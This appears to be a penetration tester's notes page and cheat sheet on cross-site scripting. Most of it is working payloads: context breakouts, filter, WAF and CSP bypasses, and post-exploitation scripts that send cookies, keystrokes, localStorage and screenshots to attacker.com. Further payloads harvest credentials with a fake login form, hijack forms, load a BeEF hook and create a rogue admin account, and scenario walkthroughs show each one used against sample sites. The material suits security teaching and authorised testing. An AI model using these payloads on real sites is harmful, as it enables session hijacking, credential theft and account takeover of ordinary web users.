---
title: Cross-Site Scripting
tags: [xss, notes]
description:  use for scripting and pentesting
date: 2025-10-03
---
# PART 1: Notes

## Core Concepts and Definitions
Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to inject malicious scripts into web applications viewed by other users. When exploited, XSS enables attackers to execute arbitrary JavaScript in victims' browsers, bypassing the Same-Origin Policy and gaining access to sensitive data, session tokens, and user interactions.

**MITRE Classification:** XSS was designated the #1 most dangerous software weakness of 2024, overtaking traditional threats like CSRF and broken access control.

### XSS Vulnerability Types

#### Reflected XSS (Non-Persistent/Type-I)
Reflected XSS occurs when user input is immediately reflected in the HTTP response without proper sanitization. The malicious script is delivered through a crafted URL or HTTP parameter and executes when the victim visits the link. This is the most common XSS variant found in penetration tests.

**Example Attack Flow:**
- Attacker crafts malicious URL: `https://target.com/search?q=<script>alert(document.cookie)</script>`
- Victim clicks link (via phishing email or social engineering)
- Application reflects input unsanitized: `<p>Results for: <script>alert(document.cookie)</script></p>`
- Browser executes malicious JavaScript in victim's session

#### Stored XSS (Persistent/Type-II)
Stored XSS vulnerabilities persist malicious payloads on the target server—typically in databases, message boards, comment fields, or user profiles. Every user viewing the infected page becomes a victim without requiring additional interaction.

**Attack Characteristics:**
- Most dangerous XSS type due to widespread impact
- Single injection affects multiple victims including administrators
- Commonly found in: blog comments, forum posts, user profiles, contact forms
- Can enable account takeover, credential harvesting, malware distribution

#### DOM-Based XSS (Client-Side)
DOM-based XSS exploits client-side JavaScript that processes untrusted data unsafely. The vulnerability exists entirely in client-side code—the malicious payload never reaches the server. Modern single-page applications (SPAs) are particularly vulnerable.

**Sources and Sinks:**
- **Common Sources (attacker-controllable):**
  - `document.URL`, `document.documentURI`
  - `location.href`, `location.search`, `location.hash`
  - `window.name`, `document.referrer`
  - `document.cookie`
- **Dangerous Sinks (execution points):**
  - `document.write()`, `element.innerHTML`
  - `eval()`, `setTimeout()`, `setInterval()`
  - `execScript()`, `location.href`

#### Blind XSS
Blind XSS is a persistent variant where payload execution occurs in hidden areas like administrative panels, logs, or backend systems. The attacker cannot directly observe execution and relies on out-of-band notifications.

**Detection Requirements:**
- External callback server (XSS Hunter, Burp Collaborator)
- Payload with notification mechanism
- Delayed execution (hours/days later)
- Commonly found in: feedback forms, contact forms, log viewers, support tickets

#### Mutation XSS (mXSS)
Mutation XSS exploits browser parsing inconsistencies where seemingly benign code mutates into executable scripts during HTML processing. The vulnerability bypasses server-side sanitization because the malicious transformation occurs client-side.

**Exploitation Mechanism:**
- Browser's `innerHTML` property auto-closes unclosed tags
- Different browsers interpret HTML standards uniquely
- Sanitized input mutates during DOM manipulation
- Discovered in Google Search Bar and DOMPurify library

## Attack Methodology and Kill-Chain Stages

### Stage 1: Reconnaissance and Enumeration
**Objectives:**
- Map application attack surface
- Identify all user input vectors
- Document technology stack and security controls
- Analyze client-side JavaScript for DOM sources/sinks

**Input Vector Discovery:**
- URL parameters (GET/POST)
- Form fields (visible and hidden)
- HTTP headers (User-Agent, Referer, Cookie)
- File upload functionality
- JSON/XML API endpoints
- WebSocket messages
- Cookie values

**Technology Fingerprinting:**
- Web framework (React, Angular, Vue, vanilla JS)
- Web Application Firewall (WAF) presence
- Content Security Policy (CSP) implementation
- JavaScript libraries and dependencies

### Stage 2: Vulnerability Detection
**Manual Testing Approach:**
- **Submit Unique Canary Values:** Use distinct alphanumeric strings (8+ chars) to track reflection
  - Test string: `xss8h3k9p`
- **Identify Reflection Context:** Determine where input appears
  - HTML body: `<div>xss8h3k9p</div>`
  - Tag attribute: `<input value="xss8h3k9p">`
  - JavaScript: `var data = "xss8h3k9p";`
  - URL/href: `<a href="http://site.com/xss8h3k9p">`
- **Test Basic Payloads:**
  - `<script>alert('XSS')</script>`
  - `<img src=x onerror=alert('XSS')>`
  - `javascript:alert('XSS')`
- **Character Filter Analysis:** Test special characters to identify blacklists
  - `'\\';!--"<XSS>=&{()}`

### Stage 3: Context Analysis and Payload Crafting
Understanding injection context is critical for successful exploitation.

**HTML Context Breakouts:**
- **Between Tags:**
  ```html
  <!-- Input appears: <div>USER_INPUT</div> -->
  Payload: <script>alert(1)</script>
  Payload: <img src=x onerror=alert(1)>
  ```

**Attribute Context Exploits:**
- **Inside Quoted Attributes:**
  ```html
  <!-- Input: <input value="USER_INPUT"> -->
  Payload: "><script>alert(1)</script>
  Payload: " autofocus onfocus=alert(1) x="
  ```
- **Inside Unquoted Attributes:**
  ```html
  <!-- Input: <input value=USER_INPUT> -->
  Payload: x onload=alert(1)
  ```
- **Inside Event Handler Attributes:**
  ```html
  <!-- Input: <body onload="var x='USER_INPUT'"> -->
  Payload: ';alert(1);//
  ```

**JavaScript Context Breakouts:**
- **String Termination:**
  ```javascript
  // Input: var data = 'USER_INPUT';
  Payload: ';alert(1);//
  Payload: </script><img src=x onerror=alert(1)>
  ```
- **Template Literals:**
  ```javascript
  // Input: var msg = `Welcome ${USER_INPUT}`;
  Payload: ${alert(1)}
  ```

### Stage 4: Filter and WAF Bypass Techniques
**Encoding and Obfuscation Methods:**
- **HTML Entity Encoding:**
  ```html
  <!-- Inside event handlers -->
  Original: <a href="#" onclick="alert(1)">
  Bypass: <a href="#" onclick="&#97;lert(1)">
  ```
- **URL Encoding:**
  - Single: `%3Cscript%3Ealert(1)%3C/script%3E`
  - Double: `%253Cscript%253Ealert(1)%253C/script%253E`
- **Unicode Escaping:**
  - `eval("\\u0061lert(1)")` // alert(1)
  - `eval("\\u{00000000061}lert(1)")` // Leading zeros bypass
- **Hex/Octal Encoding:**
  - `eval("\\x61lert(1)")` // Hex
  - `eval("\\141lert(1)")` // Octal
- **Whitespace and Special Character Injection:**
  - `<a href="   javascript:alert(1)">` <!-- ASCII backspace/control chars -->

**Tag Manipulation:**
- **Case Variation:**
  - `<ScRiPt>alert(1)</sCrIpT>`
  - `<sCrIpT>alert(1)</sCrIpT>`
- **Tag Breaking:**
  - `<scr<script>ipt>alert(1)</scr</script>ipt>`
- **Null Byte Injection:**
  - `<scri%00pt>alert(1)</scri%00pt>`

**Event Handler Alternatives:** When common handlers are blocked, use alternatives:
- `<body onload=alert(1)>`
- `<body onpageshow=alert(1)>`
- `<svg onload=alert(1)>`
- `<marquee onstart=alert(1)>`
- `<details ontoggle=alert(1) open>`
- `<video onloadstart=alert(1) src=x>`

### Stage 5: CSP Bypass Techniques
Content Security Policy can be circumvented through misconfigurations.

- **Unsafe-inline Exploitation:**
  - **CSP:** `script-src 'unsafe-inline'`
  - **Payload:** `<script>alert(1)</script>`
- **Unsafe-eval Exploitation:**
  - **CSP:** `script-src 'unsafe-eval' data:`
  - **Payload:** `<script src="data:;base64,YWxlcnQoMSk="></script>`
- **JSONP Endpoint Abuse:**
  - **CSP:** `script-src https://accounts.google.com`
  - **Payload:** `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`
- **File Upload Bypass:**
  - **CSP:** `default-src 'self'`
  - **Attack:** Upload malicious JS file, reference via relative path
  - **Payload:** `<script src="/uploads/evil.js"></script>`

## Tool Setup and Configuration

### Burp Suite Professional
**XSS Testing Workflow:**
- Enable Burp Proxy intercept
- Submit unique values to each input
- Use HTTP History search to find reflections
- Send to Intruder for payload fuzzing
- Enumerate permitted tags/attributes

**DOM Invader Extension:**
- Enable in Burp browser extensions
- Auto-detects DOM sources/sinks
- Uses canary value to track data flow
- Highlights vulnerable sinks automatically

### OWASP ZAP
**Configuration:**
- Active + Passive scanning modes
- Custom scan policies for bandwidth control
- Fuzzer for parameter testing
- High XSS detection precision (100%)

**Limitations:**
- Memory-intensive with large sessions
- Less intuitive UI than Burp Suite
- Smaller community support

### Dalfox - XSS Scanner
Advanced automated XSS scanner with multiple modes.

**Installation:**
```bash
# Homebrew
brew install dalfox
# Go
go install github.com/hahwul/dalfox/v2@latest
# Snap
sudo snap install dalfox
```

**Usage Examples:**
```bash
# Single URL scan
dalfox url https://example.com

# Scan URL with parameters
dalfox url "https://example.com/search?q=test"

# Blind XSS with callback
dalfox url https://example.com -b https://your-callback.com

# File input (multiple URLs)
dalfox file targets.txt

# Pipeline mode
cat urls.txt | dalfox pipe

# Custom headers
dalfox url https://example.com -H "Authorization: Bearer token"
```

**Key Features:**
- Parameter analysis and mining
- Reflected, Stored, DOM-based detection
- BAV (Blind XSS) testing
- Headless browser verification
- Custom payload support
- WAF detection and bypass

### XSS Hunter (Blind XSS)
Self-hosted or SaaS platform for blind XSS detection.

**Serverless Alternative - Cloudflare Workers:**
```javascript
// Basic blind XSS collector
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  if (request.method === 'POST') {
    // Collect data and send to Telegram/email
    const data = await request.json()
    // Send notification with screenshot, cookies, etc.
  }
}
```

**Payload Template:**
```html
<script>
fetch('https://your-worker.workers.dev', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: location.href,
    dom: document.documentElement.innerHTML
  })
});
</script>
```

## Post-Exploitation Techniques

### Cookie Theft and Session Hijacking
**Basic Cookie Exfiltration:**
```html
<script>fetch('https://attacker.com/collect?c=' + document.cookie);</script>
```

**Advanced Cookie Theft with Metadata:**
```html
<script>
(function() {
  var cookies = document.cookie;
  var cookieArray = cookies.split(';');
  var encodedData = btoa(JSON.stringify({
    'cookies': cookieArray,
    'url': window.location.href,
    'userAgent': navigator.userAgent,
    'referrer': document.referrer
  }));
  new Image().src = 'http://attacker.com/collect?data=' + encodedData;
})();
</script>
```

**Bypassing HttpOnly Cookies:**
```javascript
// Force reflection through server requests
fetch('/api/user/profile', { credentials: 'include' })
  .then(response => response.json())
  .then(data => {
    // Exfiltrate profile data instead
    fetch('https://attacker.com/steal>', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

### Keylogging:
```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/keys?k=' + e.key);
});
</script>
```

### Credential Harvesting via Fake Login Form:
```html
<script>
document.body.innerHTML = `
  <form action="https://attacker.com/harvest" method="POST">
    <input name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>
`;
</script>
```

### Screenshot Capture:
```html
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
html2canvas(document.body).then(canvas => {
  fetch('https://attacker.com/screenshot', {
    method: 'POST',
    body: canvas.toDataURL()
  });
});
</script>
```

## Defensive Indicators and Detection

### Server-Side Indicators:
**Input Validation Requirements:**
- Whitelist approach over blacklist
- Validate data type, length, format
- Reject invalid input rather than sanitize
- Context-specific validation rules

**Output Encoding:**
- HTML entity encoding: `< > & " '`
- JavaScript encoding for JS contexts
- URL encoding for URL contexts
- CSS encoding for style attributes

### Client-Side Detection Patterns:
**HTTP Request Signatures:**
```http
GET /search?q=<script>alert('XSS');</script> HTTP/1.1
```

**Response Analysis:**
```html
<!-- Vulnerable response -->
<h1>Search Results for "<script>alert('XSS');</script>"</h1>
```

### Common Mitigation Bypasses
- **Nested Tag Bypass:**
  - Input filter removes: `<script>`
  - Bypass: `<scr<script>ipt>alert(1)</scr</script>ipt>`
  - Result after filter: `<script>alert(1)</script>`
- **Character Limit Bypass:**
  ```
  <!-- Bypass 100-char limit using URL parameter pollution -->
  ?id=test&12345<script>alert(1)</script>12345=
  ```

## Framework-Specific Vulnerabilities

### React XSS Vectors
- **`dangerouslySetInnerHTML`:**
  ```javascript
  // Vulnerable
  function UserContent({ content }) {
    return <div dangerouslySetInnerHTML={{ __html: content }} />;
  }
  // Exploit
  const malicious = '<img src=x onerror="alert(document.cookie)">';
  ```
- **URL Parameter Injection:**
  ```javascript
  // Vulnerable
  function ProfileComponent() {
    const params = useParams();
    return <div>{decodeURIComponent(params.name)}</div>;
  }
  ```

### Angular XSS
- **Template Injection:**
  ```typescript
  @Component({
    template: `<div [innerHTML]="userInput | safeHtml"></div>`
  })
  // Bypass DomSanitizer with custom pipe
  ```

### Vue.js XSS
- **`v-html` Directive:**
  ```html
  <!-- Vulnerable -->
  <div v-html="userInput"></div>
  ```

All frameworks HTML-encode by default, protecting against basic XSS. Vulnerabilities arise when developers use unsafe methods like `dangerouslySetInnerHTML` (React), `bypassSecurityTrust` (Angular), or `v-html` (Vue).

# PART 2: RAPID-REFERENCE CHEATSHEET

## Quick Decision Tree
1. **RECONNAISSANCE**
   - Find input points (forms, URL params, headers)
   - Submit unique canary → Track reflection
   - Identify injection context (HTML/Attribute/JS)
2. **CONTEXT IDENTIFICATION**
   - HTML Body → Use `<script>` or `<img>` tags
   - Attribute → Break out with `">` or event handlers
   - JavaScript → Terminate strings with `';`
   - URL → Use `javascript:` protocol
3. **FILTER DETECTION**
   - Test special chars: `'\\';!--"<XSS>=&{()}`
   - Enumerate blocked tags/keywords
   - Note encoding/sanitization behavior
4. **BYPASS & EXPLOIT**
   - Apply encoding (URL/Unicode/Hex/HTML entities)
   - Use alternative tags/events
   - Test polyglot payloads
   - Verify CSP bypass if applicable
5. **POST-EXPLOITATION**
   - Cookie theft → Session hijacking
   - Keylogging → Credential capture
   - Blind XSS → Out-of-band callback

## Essential Payloads

### Basic Proof-of-Concept
- `<script>alert(1)</script>`
- `<script>alert(document.domain)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`

### Context-Specific Payloads
- **HTML Context:**
  - `<script>alert(1)</script>`
  - `<img src=x onerror=alert(1)>`
  - `<svg/onload=alert(1)>`
  - `<iframe src="javascript:alert(1)">`
- **Attribute Context:**
  - `" autofocus onfocus=alert(1) x="`
  - `"><script>alert(1)</script>`
  - `' onmouseover='alert(1)`
  - `" onload=alert(1) x="`
- **JavaScript Context:**
  - `';alert(1);//`
  - `';alert(1)//`
  - `</script><script>alert(1)</script>`
  - `${alert(1)}`  // Template literal
- **URL Context:**
  - `javascript:alert(1)`
  - `data:text/html,<script>alert(1)</script>`

### Filter Bypass Payloads
- **Case Manipulation:**
  - `<ScRiPt>alert(1)</sCrIpT>`
  - `<iMg sRc=x oNeRrOr=alert(1)>`
- **Encoding Bypasses:**
  - `<!-- HTML Entities --> <img src=x onerror="&#97;lert(1)">`
  - `<!-- URL Encoding --> %3Cscript%3Ealert(1)%3C/script%3E`
  - `<!-- Double URL Encoding --> %253Cscript%253Ealert(1)%253C/script%253E`
  - `<!-- Unicode --> <script>\\u0061lert(1)</script>`
  - `<!-- Hex --> <script>\\x61lert(1)</script>`
  - `<!-- Octal --> <script>\\141lert(1)</script>`
- **Tag Breaking:**
  - `<scr<script>ipt>alert(1)</scr</script>ipt>`
  - `<img/src=x/onerror=alert(1)>`
  - `<svg///onload=alert(1)>`
- **Alternative Event Handlers:**
  - `<body onload=alert(1)>`
  - `<body onpageshow=alert(1)>`
  - `<svg onload=alert(1)>`
  - `<marquee onstart=alert(1)>`
  - `<details ontoggle=alert(1) open>`
  - `<video onloadstart=alert(1) src=x>`
  - `<audio onloadstart=alert(1) src=x>`
  - `<input autofocus onfocus=alert(1)>`

### XSS Polyglot (Universal Payload):
`jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\\\x3e`

## Tool Command Reference

### Burp Suite Intruder - Tag Enumeration:
1. Intercept request with reflection point
2. Send to Intruder (Ctrl+I)
3. Set payload position: `§test§`
4. Load tag wordlist (SecLists: XSS tags)
5. Configure grep match for successful execution
6. Start attack and filter results

### Dalfox:
```bash
# Basic scan
dalfox url "https://target.com/page?param=test"

# With custom headers
dalfox url "https://target.com" -H "Cookie: session=abc123"

# Blind XSS mode
dalfox url "https://target.com" -b https://xsshunter.com/callback

# Multiple URLs from file
dalfox file targets.txt -o results.txt

# Pipeline mode (with other tools)
cat urls.txt | dalfox pipe --silence

# Custom payload file
dalfox url "https://target.com" --custom-payload payloads.txt

# Skip verification (faster)
dalfox url "https://target.com" --skip-bav

# Mining mode (find hidden parameters)
dalfox url "https://target.com" --mining-dict common.txt
```

### OWASP ZAP:
```bash
# Command-line active scan
zap.sh -quickurl https://target.com -quickout report.html

# API scan
zap-cli quick-scan --spider -r https://target.com

# Automated scan with authentication
zap.sh -cmd -quickurl https://target.com \
  -config api.key=abc123 \
  -config formauth.loginurl=https://target.com/login
```

### cURL Testing:
```bash
# Test reflection
curl "https://target.com/search?q=XSS_TEST_12345" | grep "XSS_TEST"

# POST payload
curl -X POST "https://target.com/comment" \
  -d "text=<script>alert(1)</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Custom headers
curl "https://target.com" \
  -H "User-Agent: <script>alert(1)</script>" \
  -H "Referer: <script>alert(1)</script>"
```

## Enumeration Checklist

### Port/Service Enumeration (Web Services):
- **Port 80**   → HTTP  → Test web forms, parameters
- **Port 443**  → HTTPS → Check certificate, same tests as HTTP
- **Port 8080** → Alt HTTP → Application servers (Tomcat, Jenkins)
- **Port 8443** → Alt HTTPS → Same as 8080 but TLS
- **Port 3000** → Node.js dev → Often less secure, test thoroughly
- **Port 8000** → Python dev → Django/Flask debug modes

### Input Vector Checklist:
- ✓ GET parameters         → `?id=<payload>`
- ✓ POST body parameters   → `name=<payload>`
- ✓ URL path segments      → `/user/<payload>/profile`
- ✓ HTTP headers           → User-Agent, Referer, Cookie
- ✓ JSON/XML POST data     → `{"key":"<payload>"}`
- ✓ File upload filename   → `file<payload>.jpg`
- ✓ File upload content    → SVG with embedded JS
- ✓ Cookie values          → `Cookie: session=<payload>`
- ✓ Fragment identifier    → `#<payload>`
- ✓ WebSocket messages     → `{"msg":"<payload>"}`

### Context Detection Tests:
1.  Submit: `xss_test_9x7k2`
2.  View source and find:
    - `<!-- HTML Context --> <div>xss_test_9x7k2</div>` → Payload: `<script>alert(1)</script>`
    - `<!-- Attribute Context --> <input value="xss_test_9x7k2">` → Payload: `"><script>alert(1)</script>`
    - `<!-- JavaScript Context --> var data = "xss_test_9x7k2";` → Payload: `";alert(1);//`
    - `<!-- URL Context --> <a href="/page/xss_test_9x7k2">` → Payload: `javascript:alert(1)`

## WAF/Filter Evasion Techniques

### Common WAF Bypass Methods:
- **String Concatenation:**
  - `<script>eval('al'+'ert(1)')</script>`
  - `<script>eval(atob('YWxlcnQoMSk='))</script>` // Base64
  - `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`
- **Comments in Tags:**
  - `<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>`
  - `<img src=x one<!---->rror=alert(1)>`
  - `<svg/onload=alert(1)//`
- **Newline/Tab Injection:**
  - `<script>alert(1)</script>`
  - `<img    src=x   onerror=alert(1)>`
- **NULL Byte:**
  - `<scri%00pt>alert(1)</scri%00pt>`

### CSP Bypass Decision Tree:
- **IF** CSP allows `'unsafe-inline'`
  - → `<script>alert(1)</script>`
- **ELIF** CSP allows `'unsafe-eval'`
  - → `<script src="data:;base64,YWxlcnQoMSk="></script>`
- **ELIF** CSP whitelists third-party domain
  - → Find JSONP endpoint on allowed domain
  - → `<script src="https://allowed.com/jsonp?callback=alert"></script>`
- **ELIF** CSP allows `'self'`
  - → Upload malicious JS file
  - → `<script src="/uploads/evil.js"></script>`
- **ELSE**
  - → Check for CSP bypass via open redirect
  - → Exploit DOM-based XSS (CSP doesn't block)

## Post-Exploitation Shortcuts

### Cookie Stealer (One-liner):
- `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
- `<script>new Image().src='https://attacker.com/?c='+btoa(document.cookie)></script>`

### BeEF Hook Integration:
- `<script src="http://attacker-ip:3000/hook.js"></script>`

### Keylogger (Minimal):
- `<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>`

### Form Hijacking:
- `<script>document.forms[0].action='https://attacker.com/harvest';</script>`

### Redirect to Phishing:
- `<script>location='https://attacker.com/fake-login.html'</script>`

### Admin Account Creation (if XSS in admin panel):
```html
<script>
fetch('/admin/users/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username:'hacker',password:'pass123',role:'admin'})
});
</script>
```

## Blind XSS Setup

### XSS Hunter Payload:
- `<script src="https://yourusername.xss.ht"></script>`

### Custom Callback Payload:
```html
<script>
var data = {
  url: window.location.href,
  cookie: document.cookie,
  localStorage: JSON.stringify(localStorage),
  dom: document.documentElement.outerHTML.substring(0, 5000)
};
fetch('https://your-callback.com/collect', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
</script>
```

### Burp Collaborator:
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```

# PART 3: REAL-WORLD EXAMPLES & LAB SCENARIOS

## Scenario 1: Reflected XSS in Search Function
**Target:** `https://vulnerable-site.com/search?q=test`

**Step 1 - Detection:**
```bash
# Submit canary value
curl "https://vulnerable-site.com/search?q=XSS_CANARY_8h3k"

# Check reflection in response
# Found: <h2>Search results for: XSS_CANARY_8h3k</h2>
```

**Step 2 - Basic Payload:**
`https://vulnerable-site.com/search?q=<script>alert(1)</script>`

**Step 3 - If Filtered, Try Encoding:**
```
# URL encoded
https://vulnerable-site.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# HTML entities (if reflected in attribute)
https://vulnerable-site.com/search?q=&#60;script&#62;alert(1)&#60;/script&#62;

# Alternative tags
https://vulnerable-site.com/search?q=<img src=x onerror=alert(1)>
```

**Step 4 - WAF Bypass:**
```
# If WAF blocks "script"
https://vulnerable-site.com/search?q=<svg/onload=alert(1)>

# If WAF blocks alert
https://vulnerable-site.com/search?q=<script>eval(atob('YWxlcnQoMSk='))</script>

# If WAF blocks angle brackets
https://vulnerable-site.com/search?q=%3Csvg%2Fonload%3Dalert(1)%3E
```

**Step 5 - Weaponization:**
```
// Cookie theft payload
https://vulnerable-site.com/search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>

// URL encode for delivery
https://vulnerable-site.com/search?q=%3Cscript%3Efetch%28%27https%3A%2F%2Fattacker.com%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

## Scenario 2: Stored XSS in Blog Comments
**Target:** Blog comment form at `https://blog-site.com/post/123`

**Step 1 - Submit Test Comment:**
- **Comment:** `<script>alert('TEST_XSS')</script>`

**Step 2 - If Filtered:**
- `<!-- Try alternative tags -->`
  - **Comment:** `<img src=x onerror=alert('XSS')>`
- `<!-- Try event handlers -->`
  - **Comment:** `<svg/onload=alert('XSS')>`
- `<!-- Try encoded payload -->`
  - **Comment:** `<iframe src="javascript:alert('XSS');">`

**Step 3 - If Still Filtered, Context Analysis:**
```
# Submit harmless text and view page source
Comment: TEST_COMMENT_XYZ

# Found in source:
# <div class="comment">TEST_COMMENT_XYZ</div>
# → HTML context, no attribute

# Or found:
# <div class="comment" data-text="TEST_COMMENT_XYZ">
# → Attribute context, break out with "
```

**Step 4 - Attribute Context Exploit:**
- **Comment:** `" onload="alert('XSS')" x="`
- **Result:** `<div class="comment" data-text="" onload="alert('XSS')" x="">`

**Step 5 - Cookie Stealer for All Visitors:**
- **Comment:** `<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">`

**Impact:** Every user viewing the blog post will have their session cookie exfiltrated.

## Scenario 3: DOM-Based XSS
**Target:** Single-page application with hash-based routing

**Vulnerable Code:**
```javascript
// app.js
var username = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + username;
```

**Step 1 - Identify Source/Sink:**
- **Source:** `location.hash` (attacker controllable)
- **Sink:** `innerHTML` (dangerous, executes scripts)

**Step 2 - Craft Payload:**
`https://vulnerable-spa.com/#<img src=x onerror=alert(1)>`

**Step 3 - Test in Browser:**
- **Open:** `https://vulnerable-spa.com/#<img src=x onerror=alert(document.domain)>`
- **Result:** Alert box appears with domain

**Step 4 - Advanced Exploitation:**
```
// Exfiltrate localStorage data
https://vulnerable-spa.com/#<img src=x onerror="fetch('https://attacker.com/?d='+btoa(JSON.stringify(localStorage)))">
```

**Defense Detection:**
- No server-side logs (client-side only)
- No WAF detection (never sent to server)
- CSP may not prevent (depends on configuration)

## Scenario 4: Blind XSS in Contact Form
**Target:** Contact form submissions viewed by admin in backend

**Step 1 - Setup Callback Server:**
```
# Using XSS Hunter
Payload: <script src="https://yourusername.xss.ht"></script>

# Or custom Burp Collaborator
Payload: <script src="https://BURP-COLLABORATOR.burpcollaborator.net/x.js"></script>
```

**Step 2 - Submit Payload to Contact Form:**
- **Name:** Your Name
- **Email:** attacker@example.com
- **Message:** `<script src="https://yourusername.xss.ht"></script>`

**Step 3 - Wait for Admin to View:**
- Admin logs into backend and views submissions
- Payload executes in admin's browser
- Callback server receives notification

**Step 4 - Analyze Results:**
- Check XSS Hunter dashboard for:
  - Admin's IP address
  - Browser/OS information
  - Admin's session cookies
  - Admin's localStorage data
  - Page content visible to admin

**Impact:** Potential admin account takeover via session hijacking.

## Scenario 5: CSP Bypass via JSONP
**Target:** Application with CSP: `script-src 'self' https://api.example.com`

**Step 1 - Find JSONP Endpoint on Whitelisted Domain:**
```
https://api.example.com/data?callback=processData
```

**Step 2 - Test JSONP:**
```
# Server responds with:
processData({"data":"value"})
```

**Step 3 - Exploit JSONP for XSS:**
```
<script src="https://api.example.com/data?callback=alert"></script>
# Executes: alert({"data":"value"})
```

**Step 4 - Craft Weaponized Payload:**
```
<script src="https://api.example.com/data?callback=fetch%28%27https%3A%2F%2Fattacker.com%2F%3Fc%3D%27%2Bdocument.cookie%29"></script>
```

**Impact:** CSP bypass leading to full compromise despite security policy.
